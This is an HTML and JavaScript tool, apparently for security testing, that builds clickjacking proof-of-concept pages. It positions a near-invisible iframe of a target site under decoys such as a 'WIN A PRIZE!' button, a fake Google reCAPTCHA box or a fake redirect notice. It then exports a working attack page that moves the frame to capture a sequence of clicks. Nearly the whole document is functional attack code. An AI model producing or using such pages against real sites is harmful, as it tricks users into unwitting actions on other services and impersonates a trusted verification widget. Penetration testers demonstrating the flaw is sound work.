<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Clickjacking PoC Builder</title>
    <style>
        body { font-family: 'Roboto', sans-serif; background: #f0f0f0; margin: 0; overflow: hidden; }

        /* --- THE FAKE RECAPTCHA STYLES --- */
        .recaptcha-box {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            width: 300px;
            height: 74px;
            display: flex;
            align-items: center;
            padding: 0 12px;
            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 50;
            user-select: none;
            cursor: pointer;
        }

        .recaptcha-checkbox {
            width: 24px;
            height: 24px;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            background-color: #fff;
            margin-right: 12px;
            transition: all 0.3s ease;
        }

        .recaptcha-checkbox.checked {
            background-color: #4285f4;
            border-color: #4285f4;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E");
            background-size: 16px;
            background-repeat: no-repeat;
            background-position: center;
        }

        .recaptcha-checkbox.loading {
            border-color: #4285f4;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .recaptcha-text {
            font-size: 14px;
            color: #000;
            font-weight: 500;
            flex-grow: 1;
            transition: color 0.3s ease;
        }

        .recaptcha-text.loading {
            color: #4285f4;
        }

        .recaptcha-text.error {
            color: #d32f2f;
        }

        .recaptcha-logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-left: auto;
        }

        .recaptcha-logo-img {
            width: 32px;
            height: 32px;
            background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png");
            background-size: 32px;
            background-repeat: no-repeat;
        }

        .recaptcha-logo-text {
            font-size: 10px;
            color: #555;
            margin-top: 2px;
            text-align: center;
        }

        .recaptcha-privacy {
            font-size: 8px;
            color: #555;
            margin-top: 0px;
            text-align: center;
        }

        /* --- REDIRECT MESSAGE STYLES --- */
        .redirect-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-family: Arial, sans-serif;
            z-index: 50;
        }

        .redirect-message p {
            margin: 0;
            padding: 5px 0;
            font-size: 16px;
            color: #333;
        }

        .redirect-message a {
            color: #007bff;
            text-decoration: underline;
            cursor: pointer;
        }

        /* --- CONTROLS & LAYOUT --- */
        #controls {
            position: fixed; top: 10px; left: 10px; z-index: 1000;
            background: white; padding: 15px; border: 1px solid #ccc;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2); border-radius: 5px;
            width: 250px;
        }
        
        #decoy_container {
            position: absolute; top: 300px; left: 400px; z-index: 50;
            pointer-events: none; /* Pass clicks to iframe during calibration */
        }

        #decoy_button {
            background: #007bff; color: white; padding: 15px 30px;
            border: none; font-size: 16px; font-weight: bold;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }

        #iframe_container {
            position: absolute; top: 0; left: 0;
            width: 80%; height: 80%; z-index: 10;
        }
        
        iframe {
            width: 100%; height: 100%; border: none;
            opacity: 0.5;
        }

        /* --- DRAG & RESIZE VISUALS --- */
        #drag_overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 11;
            cursor: grab; border: 2px dashed rgba(0,0,0,0.2);
        }
        #drag_overlay.dragging { cursor: grabbing; border-color: rgba(0,0,0,0.5); }
        
        .resize-handle { position: absolute; background: #007bff; z-index: 12; }
        .resize-handle.corner { width: 12px; height: 12px; border: 1px solid white; }
        .resize-handle.nw { top: -6px; left: -6px; cursor: nw-resize; }
        .resize-handle.se { bottom: -6px; right: -6px; cursor: se-resize; }

        .label { font-size: 12px; color: #666; margin-top: 10px; display: block;}
    </style>
</head>
<body>

    <div id="controls">
        <h3>PoC Calibration</h3>
        <p style="font-size:12px">1. Align target button under decoy.</p>
        <p style="font-size:12px">3. If attack is multi-click, record step and reposition iframe for next click (requires guessing from second click onwards, unfortunately.)</p>
        <p style="font-size:12px">3. If only single-click, just export the HTML when ready.</p>
        
        <label class="label">Target Opacity (exports to 0.0001):</label>
        <input type="range" min="0" max="1" step="0.1" value="0.5" id="opacitySlider">
        
        <label class="label">Decoy Type:</label>
        <select id="decoyType" style="width: 100%; margin-bottom: 10px;">
            <option value="button">Generic Blue Button</option>
            <option value="recaptcha">Fake reCAPTCHA</option>
            <option value="redirect">Redirect Message</option>
        </select>
        
        <label class="label">Decoy Text:</label>
        <input type="text" value="WIN A PRIZE!" id="decoyText" style="width: 100%">
        
        <hr>
        <label class="label">Multi-Click Sequencer:</label>
        <div style="display: flex; gap: 5px; margin-bottom: 10px;">
            <button onclick="recordStep()" style="flex: 1;">Record Step</button>
            <button onclick="clearSteps()" style="flex: 1; background: #d9534f; color: white; border: white;">Reset</button>
        </div>
        <p id="stepDisplay" style="font-size: 10px; margin: 0;">Steps Recorded: 0</p>
        <hr>

        <button onclick="exportPoC()" style="width:100%; padding: 8px; cursor:pointer;">Export Final HTML</button>
        <p id="coords" style="font-size: 10px; font-family: monospace; margin-top: 10px;"></p>
    </div>

    <div id="decoy_container">
        
        <button id="decoy_button">WIN A PRIZE!</button>

    </div>

    <div id="decoy_recaptcha" class="recaptcha-box" style="display: none;">
        <div class="recaptcha-checkbox"></div>
        <div class="recaptcha-text">I'm not a robot</div>
        <div class="recaptcha-logo">
            <div class="recaptcha-logo-img"></div>
            <div class="recaptcha-logo-text">reCAPTCHA</div>
            <div class="recaptcha-privacy">Privacy - Terms</div>
        </div>
    </div>

    <div id="decoy_redirect" class="redirect-message" style="display: none;">
        <p>You're being redirected.</p>
        <p>If the page doesn't load automatically, click <a href="#">here</a>.</p>
    </div>

    <div id="iframe_container">
        <iframe id="target_frame" src="{{TARGET_URL}}"></iframe>
        <div id="drag_overlay"></div>
        <div class="resize-handle corner nw" data-direction="nw"></div>
        <div class="resize-handle corner se" data-direction="se"></div>
    </div>

    <script>
        const container = document.getElementById('iframe_container');
        const overlay = document.getElementById('drag_overlay');
        const slider = document.getElementById('opacitySlider');
        const frame = document.getElementById('target_frame');
        const decoyBtn = document.getElementById('decoy_button');
        const decoyRecaptcha = document.getElementById('decoy_recaptcha');
        const decoyRedirect = document.getElementById('decoy_redirect');
        const decoyType = document.getElementById('decoyType');
        const decoyText = document.getElementById('decoyText');
        let steps = [];
        let currentStepIndex = 0;
        
        let isDragging = false;
        let isResizing = false;
        let startX, startY, initialLeft, initialTop, initialWidth, initialHeight;
        let resizeDir = '';

        function recordStep() {
            // Save current state of the iframe
            const step = {
                top: container.style.top || '0px',
                left: container.style.left || '0px',
                width: container.style.width || '80%',
                height: container.style.height || '80%'
            };
            
            steps.push(step);
            
            // Update UI
            document.getElementById('stepDisplay').innerText = `Steps Recorded: ${steps.length}`;
            
            // Visual feedback
            const btn = document.querySelector('button[onclick="recordStep()"]');
            const originalText = btn.innerText;
            btn.innerText = "Saved!";
            setTimeout(() => btn.innerText = originalText, 500);
        }

        function clearSteps() {
            steps = [];
            document.getElementById('stepDisplay').innerText = "Steps Recorded: 0";
        }

        // Add click handler for reCAPTCHA animation
        const recaptchaBox = document.getElementById('decoy_recaptcha');
        let recaptchaLoading = false;

        recaptchaBox.addEventListener('click', (e) => {
            if (recaptchaLoading) return;

            const checkbox = recaptchaBox.querySelector('.recaptcha-checkbox');
            const text = recaptchaBox.querySelector('.recaptcha-text');

            recaptchaLoading = true;
            checkbox.classList.remove('checked');
            checkbox.classList.add('loading');
            text.classList.add('loading');
            text.innerText = 'Verifying...';

            // Simulate verification failure after 2 seconds
            setTimeout(() => {
                checkbox.classList.remove('loading');
                text.classList.remove('loading');
                text.classList.add('error');
                text.innerText = 'Try again';

                // Reset after 1.5 seconds
                setTimeout(() => {
                    text.classList.remove('error');
                    text.innerText = "I'm not a robot";
                    recaptchaLoading = false;
                }, 1500);
            }, 2000);
        });

        // Toggle Decoy Type
        decoyType.addEventListener('change', (e) => {
            if(e.target.value === 'recaptcha'){
                decoyBtn.style.display = 'none';
                decoyRecaptcha.style.display = 'flex';
                decoyRedirect.style.display = 'none';
                decoyText.disabled = true;
            } else if(e.target.value === 'redirect'){
                decoyBtn.style.display = 'none';
                decoyRecaptcha.style.display = 'none';
                decoyRedirect.style.display = 'block';
                decoyText.disabled = true;
            } else {
                decoyBtn.style.display = 'block';
                decoyRecaptcha.style.display = 'none';
                decoyRedirect.style.display = 'none';
                decoyText.disabled = false;
            }
        });

        // Update Text
        decoyText.addEventListener('input', (e) => {
            decoyBtn.innerText = e.target.value;
        });

        // Opacity
        slider.addEventListener('input', (e) => {
            frame.style.opacity = e.target.value;
        });

        // Dragging Logic
        overlay.addEventListener('mousedown', (e) => {
            isDragging = true;
            startX = e.clientX;
            startY = e.clientY;
            initialLeft = container.offsetLeft;
            initialTop = container.offsetTop;
            overlay.classList.add('dragging');
        });

        // Resizing Logic
        document.querySelectorAll('.resize-handle').forEach(handle => {
            handle.addEventListener('mousedown', (e) => {
                e.stopPropagation();
                isResizing = true;
                resizeDir = handle.dataset.direction;
                startX = e.clientX;
                startY = e.clientY;
                initialWidth = container.offsetWidth;
                initialHeight = container.offsetHeight;
                initialLeft = container.offsetLeft;
                initialTop = container.offsetTop;
            });
        });

        window.addEventListener('mouseup', () => {
            isDragging = false;
            isResizing = false;
            overlay.classList.remove('dragging');
            updateCoords();
        });

        window.addEventListener('mousemove', (e) => {
            if (isDragging) {
                const dx = e.clientX - startX;
                const dy = e.clientY - startY;
                container.style.left = `${initialLeft + dx}px`;
                container.style.top = `${initialTop + dy}px`;
            } else if (isResizing) {
                const dx = e.clientX - startX;
                const dy = e.clientY - startY;
                if(resizeDir === 'se') {
                    container.style.width = `${initialWidth + dx}px`;
                    container.style.height = `${initialHeight + dy}px`;
                } else if(resizeDir === 'nw') {
                    container.style.width = `${initialWidth - dx}px`;
                    container.style.height = `${initialHeight - dy}px`;
                    container.style.left = `${initialLeft + dx}px`;
                    container.style.top = `${initialTop + dy}px`;
                }
            }
        });

        function updateCoords() {
            document.getElementById('coords').innerText = 
                `Pos: ${container.style.left}, ${container.style.top} | Size: ${container.style.width} x ${container.style.height}`;
        }

        function exportPoC() {
            // If no steps recorded, just use current position as a single step
            if (steps.length === 0) {
                recordStep();
            }
            let style = "";
            let html = "";
            
            // Get current iframe values, falling back to defaults if not set
            const top = container.style.top || '0';
            const left = container.style.left || '0';
            const width = container.style.width || '80%';
            const height = container.style.height || '80%';
            
            if(decoyType.value === 'recaptcha') {
                style = `
                .recaptcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 12px; box-shadow: 0 0 4px 1px rgba(0,0,0,0.08); font-family: 'Roboto', sans-serif; cursor: pointer; user-select: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1; }
                .recaptcha-checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; background-color: #fff; margin-right: 12px; transition: all 0.3s ease; }
                .recaptcha-checkbox.checked { background-color: #4285f4; border-color: #4285f4; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E"); background-size: 16px; background-repeat: no-repeat; background-position: center; }
                .recaptcha-checkbox.loading { border-color: #4285f4; animation: spin 1s linear infinite; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                .recaptcha-text { font-size: 14px; color: #000; font-weight: 500; flex-grow: 1; transition: color 0.3s ease; }
                .recaptcha-text.loading { color: #4285f4; }
                .recaptcha-text.error { color: #d32f2f; }
                .recaptcha-logo-img { width: 32px; height: 32px; background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png"); background-size: 32px; background-repeat: no-repeat; margin: 0 auto; }
                .recaptcha-logo-text { font-size: 10px; color: #555; text-align: center; margin-top: 2px; }
                .recaptcha-privacy { font-size: 8px; color: #555; text-align: center; }`;
                
                html = `
                <div class="recaptcha-box" id="recaptcha_decoy">
                    <div class="recaptcha-checkbox"></div>
                    <div class="recaptcha-text">I'm not a robot</div>
                    <div>
                        <div class="recaptcha-logo-img"></div>
                        <div class="recaptcha-logo-text">reCAPTCHA</div>
                        <div class="recaptcha-privacy">Privacy - Terms</div>
                    </div>
                </div>`;
            } else if(decoyType.value === 'redirect') {
                style = `
                .redirect-message { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; font-family: Arial, sans-serif; z-index: 1; }
                .redirect-message p { margin: 0; padding: 5px 0; font-size: 16px; color: #333; }
                .redirect-message a { color: #007bff; text-decoration: underline; cursor: pointer; }`;
                
                html = `
                <div class="redirect-message">
                    <p>You're being redirected.</p>
                    <p>If the page doesn't load automatically, click <a href="#">here</a>.</p>
                </div>`;
            } else {
                style = `#decoy { position: absolute; top: 300px; left: 400px; z-index: 1; background: #007bff; color: white; padding: 15px 30px; border: none; font-size: 16px; font-weight: bold; }`;
                html = `<button id="decoy">${decoyBtn.innerText}</button>`;
            }

        const stepsJSON = JSON.stringify(steps);

        const finalCode = `
            <!DOCTYPE html>
            <html>
            <head>
            <style>
                body { margin: 0; overflow: hidden; height: 100vh; }
                /* The iframe starts at the position of Step 1 */
                #target_frame { 
                    position: absolute; 
                    top: ${steps[0].top}; left: ${steps[0].left}; 
                    width: ${steps[0].width}; height: ${steps[0].height}; 
                    opacity: 0.0001; z-index: 2; border: none; 
                }
                ${style}
            </style>
            </head>
            <body>
                <h3 style="position:fixed; bottom:0; right:0; font-family:sans-serif; font-size:10px; opacity:0.5; margin:5px;">
                    Click Count: <span id="click_counter">0</span> / ${steps.length}
                </h3>

                ${html}
                
                <iframe id="target_frame" src="${frame.src}"></iframe>

                <script>
                    // Multi-click logic
                    const steps = ${stepsJSON};
                    let currentStep = 0;
                    const iframe = document.getElementById('target_frame');
                    const counter = document.getElementById('click_counter');

                    // reCAPTCHA animation logic (only for reCAPTCHA decoy)
                    ${decoyType.value === 'recaptcha' ? `
                    const recaptchaBox = document.getElementById('recaptcha_decoy');
                    let recaptchaLoading = false;
                    
                    function animateRecaptcha() {
                        if (recaptchaLoading) return;
                        
                        const checkbox = recaptchaBox.querySelector('.recaptcha-checkbox');
                        const text = recaptchaBox.querySelector('.recaptcha-text');
                        
                        recaptchaLoading = true;
                        checkbox.classList.remove('checked');
                        checkbox.classList.add('loading');
                        text.classList.add('loading');
                        text.innerText = 'Verifying...';
                        
                        setTimeout(() => {
                            checkbox.classList.remove('loading');
                            text.classList.remove('loading');
                            text.classList.add('error');
                            text.innerText = 'Try again';
                            
                            setTimeout(() => {
                                text.classList.remove('error');
                                text.innerText = "I'm not a robot";
                                recaptchaLoading = false;
                            }, 1500);
                        }, 2000);
                    }` : ''}

                    // We listen for the window losing focus (which happens when they click the iframe)
                    window.addEventListener('blur', function() {
                        // Trigger reCAPTCHA animation on click
                        ${decoyType.value === 'recaptcha' ? 'animateRecaptcha();' : ''}
                        
                        // Wait a split second to allow the click to register in the iframe
                        setTimeout(() => {
                            currentStep++;
                            
                            if (currentStep < steps.length) {
                                // Move iframe to the next position
                                iframe.style.top = steps[currentStep].top;
                                iframe.style.left = steps[currentStep].left;
                                iframe.style.width = steps[currentStep].width;
                                iframe.style.height = steps[currentStep].height;
                                
                                console.log("Advanced to Step " + (currentStep + 1));
                                counter.innerText = currentStep;
                                
                                // Crucial: We must reclaim focus to detect the NEXT click
                                window.focus(); 
                                // Note: Browsers sometimes block programmatic focus. 
                                // A common trick is to alert() or simply hope the user clicks the "background" 
                                // if your decoy requires it.
                            } else {
                                console.log("Attack sequence complete");
                                counter.innerText = "Done";
                                // Optionally hide everything or redirect
                            }
                        }, 200);
                    });
                <\/script>
            </body>
            </html>`;
        console.log(finalCode);
        alert("PoC HTML code has been logged to the Developer Console (F12)!");
        }
    </script>
</body>
</html>